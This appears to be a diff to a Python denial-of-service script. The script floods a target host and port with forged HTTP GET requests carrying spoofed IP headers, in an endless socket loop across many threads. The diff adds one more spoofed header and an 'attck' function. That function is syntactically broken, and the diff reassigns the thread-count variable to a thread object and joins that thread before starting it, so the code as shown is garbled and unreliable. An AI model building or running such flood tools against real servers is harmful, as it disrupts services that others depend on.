@@ -264,12 +264,13 @@ def start():
   hh = random._urandom(999999)
   xx = int(0)
   nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
+  cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
   ipser = "IP: "+random.choice(userip)+"\r\n"
   accept = random.choice(acceptall)+"\r\n"
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-  main_req = ipser + nolakall + content + length + accept + target_host + "\r\n"
+  main_req = ipser + cekall + nolakall + content + length + accept + target_host + "\r\n"
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -282,7 +283,12 @@ def start():
         except:
             s.close()
             print('[+] server error')
-
+def attck():
+    for i in range(100000)
+    print(i)
+attck()
 for x in range(th):
     thred = threading.Thread(target=start)
+    th = threading.Thread(target=attck)
+    th.join()
     thred.start()
